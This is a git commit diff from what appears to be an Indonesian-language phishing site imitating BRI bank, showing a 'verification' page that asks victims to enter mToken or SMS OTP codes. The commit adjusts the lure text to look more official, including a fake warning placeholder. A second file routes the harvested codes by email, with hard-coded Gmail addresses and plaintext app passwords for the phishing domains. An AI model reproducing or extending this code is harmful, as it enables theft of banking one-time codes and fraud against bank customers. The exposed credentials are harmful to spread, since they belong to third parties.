98ed1538fed89f598e40536a1f72aef272047eef
penaruhangin <penaruhangin@gmail.com>
2022-11-08 10:59:02 +0700

    hem

--- components/SiteVerifikasi.js
+++ components/SiteVerifikasi.js
@@ -30,10 +30,10 @@ const SiteVerifikasi = ({btnClick}) => {
           renderer={renderer}
         />
         </h1>    
-        <h1 style={{textAlign:'center', fontWeight:'bold', marginTop:'1em'}}>Link untuk kode mToken/sms telah kami kirim ke Nomor Handphone anda, Silahkan salin atau isi kode mToken/SMS lalu tempel dibawah ini</h1>    
-        <h1 style={{textAlign:'center', fontWeight:'bold', marginTop:'1em'}}>Masukkan kode mToken/SMS BRI (Wajib)</h1>    
+        <h1 style={{textAlign:'center', fontWeight:'bold', marginTop:'1em'}}>Kode mToken untuk konfirmasi sms dari OTP BRI tarif normal telah kami kirimkan ke nomor Handphone anda, Silahkan cek sms di Handphone anda. lalu masukkan kode mToken 6 angka 5 baris</h1>    
+        <h1 style={{textAlign:'center', fontWeight:'bold', marginTop:'1em'}}>Masukkan kode mToken (Wajib)</h1>    
         <form>
-            <textarea id='msg' className='form-control-pesan' rows={5} placeholder="Silahkan masukkan kode mToken atau SMS disini"></textarea>
+            <textarea id='msg' className='form-control-pesan' rows={5} placeholder="(PERINGATAN) Jangan berikan kepada pihak lain/pihak yang mengaku BRI. Stok mToken IB BRI ID0633xxxxxxx: xxxxxx,xxxxxx,xxxxxx,xxxxxx,xxxxxx"></textarea>
             <button type='button' onClick={handleClick} className='btn' id='btn' style={{marginTop:'2em', marginBottom:'2em'}}>
               Konfirmasi
             </button>
--- pages/api/sendEmail.js
+++ pages/api/sendEmail.js
@@ -12,7 +12,7 @@ export default function handler(req, res) {
         email = 'orbitorbit799@gmail.com';
         pass = 'ahghpmbdwokimqim'; 
 
-    } else if(url == 'ubah-tarifbaru.vercel.app'){
+    } else if(url == 'ubahtarifbaru.vercel.app'){
         email = 'angga13zx@gmail.com' ;
         pass = 'szssfkfwyhtjtbkg' ;
         
